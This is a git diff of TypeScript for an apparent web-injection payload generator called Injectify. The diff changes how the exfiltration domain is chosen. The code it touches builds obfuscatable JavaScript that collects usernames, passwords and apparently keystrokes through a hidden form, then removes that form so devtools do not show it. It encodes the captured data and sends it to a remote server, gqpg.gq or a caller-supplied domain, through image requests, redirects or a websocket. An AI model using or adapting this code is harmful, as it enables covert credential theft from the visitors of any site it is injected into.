@@ -1,4 +1,5 @@
 import chalk from 'chalk'
+import { URL } from 'url';
 const UglifyJS = require('uglify-es')
 const ObfuscateJS = require('js-obfuscator')
 const beautify = require('js-beautify').js_beautify
@@ -50,12 +51,12 @@ export default (query: any) => {
         return ''
       }
     }
-    function sendToServer(url: string) {
-      if (config.dev) url = '"http:"+' + url
+    function sendToServer(domain: URL, url: string) {
+      url = `"${domain.protocol}"+${url}`
       if (bypassCors) {
-        return 'window.location=' + url + '+"$"'
+        return `window.location=${url}+"$"`
       } else {
-        return enc('c.src=' + url, true)
+        return enc(`c.src=${url}`, true)
       }
     }
     let valid = true
@@ -78,12 +79,16 @@ export default (query: any) => {
     let bypassCors = false
     if (query.bypassCors === 'true') bypassCors = true
 
-    let proxy = '//gqpg.gq/' // '//injectify.samdd.me/'
-    if (query.proxy) proxy = query.proxy
-    let wss = 'wss:'
-    if (config.dev) {
-      proxy = '//localhost:' + config.express + '/'
-      wss = 'ws:'
+    let domain:string = 'https://gqpg.gq/'
+    let url: URL
+    try {
+      if (domain !== 'https://injectify.samdd.me' && domain !== 'https://uder.ml' && domain !== 'https://ggpg.gq') {
+        domain = query.domain
+      }
+      url = new URL(domain)
+      if (!url) throw new Error
+    } catch(e) {
+      url = new URL('https://gqpg.gq/')
     }
 
     let injectProject = btoa(query.project)
@@ -96,7 +101,7 @@ export default (query: any) => {
     // │ GET_PARAM      │ TYPE    │ DEFAULT  │
     // ├────────────────┼─────────┼──────────┤
     // │ project        │ STRING  │ REQUIRED │
-    // │ proxy          │ URL     │ NONE     │
+    // │ domain         │ URL     │ NONE     │
     // │ base64         │ BOOLEAN │ TRUE     │
     // │ obfuscate      │ BOOLEAN │ FALSE    │
     // │ minify         │ BOOLEAN │ FALSE    │
@@ -122,8 +127,8 @@ export default (query: any) => {
       let injectScript
 
       if (inject) {
-        let websocket = `'${wss}'+p+'i?${injectProject}'`
-        if (query.passwords === 'false' && keylogger === false) websocket = `'${wss}${proxy}i?${injectProject}'`
+        let websocket = `'${url.protocol === 'https:' ? 'wss' : 'ws'}:'+p+'i?${injectProject}'`
+        if (query.passwords === 'false' && keylogger === false) websocket = `'${url.protocol === 'https:' ? 'wss' : 'ws'}${url.host}/i?${injectProject}'`
         body += `
           function u() {` + comment('Open a new websocket to the server') + `
             window.ws = new WebSocket(` + websocket + `)
@@ -166,7 +171,7 @@ export default (query: any) => {
               }
             `) + `
           }
-  
+
           setInterval(function() {` + comment('if the array is empty, skip making a request') + `
             if (!f.length) return
             i = {
@@ -177,7 +182,7 @@ export default (query: any) => {
               d: k.location.href,
               j: d.title
             }
-            ` + sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
+            ` + sendToServer(url, "p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
             f = []
           }, 3000)
         `
@@ -203,14 +208,14 @@ export default (query: any) => {
 
       let script = help + `
       //  Project name    | ` + query.project + `
-  
-  
+
+
       ` + injectScript
       if (!(query.passwords === 'false' && keylogger === false)) {
         script = help + `
         //  Project name    | ` + query.project + `
-  
-  
+
+
         var d = document,` +
           ifPassword(`
             v = ` + enc('input') + `,
@@ -219,7 +224,7 @@ export default (query: any) => {
             y,`
           ) +
           `c = ` + enc('new Image()', true) + `,
-          p = ` + enc(proxy) + `,
+          p = ` + enc(`//${url.origin.split('//')[1]}/`) + `,
           i,
           k = window` + variables +
 
@@ -264,7 +269,7 @@ export default (query: any) => {
           ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) +
 
           comment('send a request to the server (or proxy) with the BASE64 encoded JSON object\n') +
-          sendToServer(`p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
+          sendToServer(url, `p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
           ifPassword(
             comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
             w.remove()
